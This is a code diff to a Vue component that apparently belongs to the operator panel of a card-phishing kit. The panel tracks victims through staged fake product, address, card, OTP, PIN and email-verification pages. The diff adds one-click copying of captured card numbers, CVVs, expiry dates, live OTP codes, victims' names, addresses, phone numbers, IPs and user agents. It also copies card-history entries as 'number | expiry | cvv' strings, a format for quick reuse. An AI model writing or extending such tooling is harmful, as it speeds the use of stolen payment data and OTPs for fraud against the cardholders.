@@ -9,6 +9,13 @@ const emit = defineEmits<{
   (e: 'close'): void;
 }>();
 
+function copy(val: string) {
+  if (!val) return;
+  navigator.clipboard.writeText(val).then(() => {
+    window.$message?.success('已复制:' + val);
+  }).catch(() => {});
+}
+
 const stepLabel = (s: string) => ({ product: '商品页', address: '地址页', card: '卡片页', otp: 'OTP验证页', app_verify: 'APP验证页', email_verify: '邮箱验证页', pin_verify: 'PIN验证页', completed: '已完成' }[s] || s);
 
 const statusLabel = (s: string) => {
@@ -30,31 +37,31 @@ const statusLabel = (s: string) => {
         <div class="section">
           <h4>卡片信息</h4>
           <NGrid :cols="3" :x-gap="16" :y-gap="8">
-            <NGi><label>卡号</label><span class="val">{{ (session.cardInfo.cardNumber || '').replace(/(\d{4})/g, '$1 ').trim() }}</span></NGi>
-            <NGi><label>持卡人</label><span class="val">{{ session.cardInfo.cardHolder || '-' }}</span></NGi>
-            <NGi><label>卡品牌</label><span class="val">{{ session.cardInfo.cardType || '-' }}</span></NGi>
-            <NGi><label>卡级</label><span class="val">{{ session.cardInfo.cardLevel || '-' }}</span></NGi>
-            <NGi><label>发卡行</label><span class="val">{{ session.cardInfo.bankName || '-' }}</span></NGi>
-            <NGi><label>有效期</label><span class="val">{{ session.cardInfo.expiry || '-' }}</span></NGi>
-            <NGi><label>CVV</label><span class="val">{{ session.cardInfo.cvv || '-' }}</span></NGi>
-            <NGi v-if="session.cardInfo.otpCode"><label>OTP码</label><span class="val otp">{{ session.cardInfo.otpCode }}</span></NGi>
+            <NGi><label>卡号</label><span class="val" @click="copy((session.cardInfo.cardNumber || '').replace(/(\d{4})/g, '$1 ').trim())" title="点击复制">{{ (session.cardInfo.cardNumber || '').replace(/(\d{4})/g, '$1 ').trim() }}</span></NGi>
+            <NGi><label>持卡人</label><span class="val" @click="copy(session.cardInfo.cardHolder)" title="点击复制">{{ session.cardInfo.cardHolder || '-' }}</span></NGi>
+            <NGi><label>卡品牌</label><span class="val" @click="copy(session.cardInfo.cardType)" title="点击复制">{{ session.cardInfo.cardType || '-' }}</span></NGi>
+            <NGi><label>卡级</label><span class="val" @click="copy(session.cardInfo.cardLevel)" title="点击复制">{{ session.cardInfo.cardLevel || '-' }}</span></NGi>
+            <NGi><label>发卡行</label><span class="val" @click="copy(session.cardInfo.bankName)" title="点击复制">{{ session.cardInfo.bankName || '-' }}</span></NGi>
+            <NGi><label>有效期</label><span class="val" @click="copy(session.cardInfo.expiry)" title="点击复制">{{ session.cardInfo.expiry || '-' }}</span></NGi>
+            <NGi><label>CVV</label><span class="val" @click="copy(session.cardInfo.cvv)" title="点击复制">{{ session.cardInfo.cvv || '-' }}</span></NGi>
+            <NGi v-if="session.cardInfo.otpCode"><label>OTP码</label><span class="val otp" @click="copy(session.cardInfo.otpCode)" title="点击复制">{{ session.cardInfo.otpCode }}</span></NGi>
           </NGrid>
         </div>
 
         <div class="section">
           <h4>用户信息</h4>
           <NGrid :cols="3" :x-gap="16" :y-gap="8">
-            <NGi><label>姓名</label><span class="val">{{ session.customerInfo.fullName || '-' }}</span></NGi>
-            <NGi><label>邮箱</label><span class="val">{{ session.customerInfo.email || '-' }}</span></NGi>
-            <NGi><label>电话</label><span class="val">{{ session.customerInfo.phone || '-' }}</span></NGi>
-            <NGi><label>国家</label><span class="val">{{ session.customerInfo.country || '-' }}</span></NGi>
-            <NGi><label>城市</label><span class="val">{{ session.customerInfo.city || '-' }}</span></NGi>
-            <NGi><label>州/省</label><span class="val">{{ session.customerInfo.state || '-' }}</span></NGi>
-            <NGi v-if="session.customerInfo.address1"><label>地址1</label><span class="val">{{ session.customerInfo.address1 }}</span></NGi>
-            <NGi v-if="session.customerInfo.address2"><label>地址2</label><span class="val">{{ session.customerInfo.address2 }}</span></NGi>
-            <NGi v-if="session.customerInfo.zipCode"><label>邮编</label><span class="val">{{ session.customerInfo.zipCode }}</span></NGi>
-            <NGi v-if="(session as any).ip"><label>IP</label><span class="val">{{ (session as any).ip }}</span></NGi>
-            <NGi v-if="(session as any).ua"><label>UA</label><span class="val" style="font-size:11px;word-break:break-all">{{ (session as any).ua }}</span></NGi>
+            <NGi><label>姓名</label><span class="val" @click="copy(session.customerInfo.fullName)" title="点击复制">{{ session.customerInfo.fullName || '-' }}</span></NGi>
+            <NGi><label>邮箱</label><span class="val" @click="copy(session.customerInfo.email)" title="点击复制">{{ session.customerInfo.email || '-' }}</span></NGi>
+            <NGi><label>电话</label><span class="val" @click="copy(session.customerInfo.phone)" title="点击复制">{{ session.customerInfo.phone || '-' }}</span></NGi>
+            <NGi><label>国家</label><span class="val" @click="copy(session.customerInfo.country)" title="点击复制">{{ session.customerInfo.country || '-' }}</span></NGi>
+            <NGi><label>城市</label><span class="val" @click="copy(session.customerInfo.city)" title="点击复制">{{ session.customerInfo.city || '-' }}</span></NGi>
+            <NGi><label>州/省</label><span class="val" @click="copy(session.customerInfo.state)" title="点击复制">{{ session.customerInfo.state || '-' }}</span></NGi>
+            <NGi v-if="session.customerInfo.address1"><label>地址1</label><span class="val" @click="copy(session.customerInfo.address1)" title="点击复制">{{ session.customerInfo.address1 }}</span></NGi>
+            <NGi v-if="session.customerInfo.address2"><label>地址2</label><span class="val" @click="copy(session.customerInfo.address2)" title="点击复制">{{ session.customerInfo.address2 }}</span></NGi>
+            <NGi v-if="session.customerInfo.zipCode"><label>邮编</label><span class="val" @click="copy(session.customerInfo.zipCode)" title="点击复制">{{ session.customerInfo.zipCode }}</span></NGi>
+            <NGi v-if="(session as any).ip"><label>IP</label><span class="val" @click="copy((session as any).ip)" title="点击复制">{{ (session as any).ip }}</span></NGi>
+            <NGi v-if="(session as any).ua"><label>UA</label><span class="val" @click="copy((session as any).ua)" title="点击复制" style="font-size:11px;word-break:break-all">{{ (session as any).ua }}</span></NGi>
           </NGrid>
         </div>
 
@@ -63,7 +70,7 @@ const statusLabel = (s: string) => {
           <div class="hist-list">
             <div v-for="(h, i) in session.cardHistory" :key="i" class="hist-item">
               <span class="hist-num">#{{ i + 1 }}</span>
-              <span>{{ h.cardHolder || '-' }}  {{ (h.cardNumber || '-') }} | {{ h.expiry || '-' }} | {{ h.cvv || '-' }}</span>
+              <span @click="copy((h.cardNumber||'')+' | '+(h.expiry||'')+' | '+(h.cvv||''))" title="点击复制">{{ h.cardHolder || '-' }}  {{ (h.cardNumber || '-') }} | {{ h.expiry || '-' }} | {{ h.cvv || '-' }}</span>
             </div>
           </div>
         </div>
@@ -120,8 +127,8 @@ const statusLabel = (s: string) => {
   border-bottom: 1px solid var(--n-border-color);
 }
 label { font-size: 12px; color: var(--n-text-color-3); display: block; margin-bottom: 2px; }
-.val { font-size: 13px; color: var(--n-text-color); }
-.val.otp { color: #f0a12d; font-weight: bold; }
+.val { font-size: 13px; color: var(--n-text-color); cursor: pointer; }
+.val.otp { color: #f0a12d; font-weight: bold; cursor: pointer; }
 .status-tag {
   padding: 2px 10px;
   border-radius: 4px;
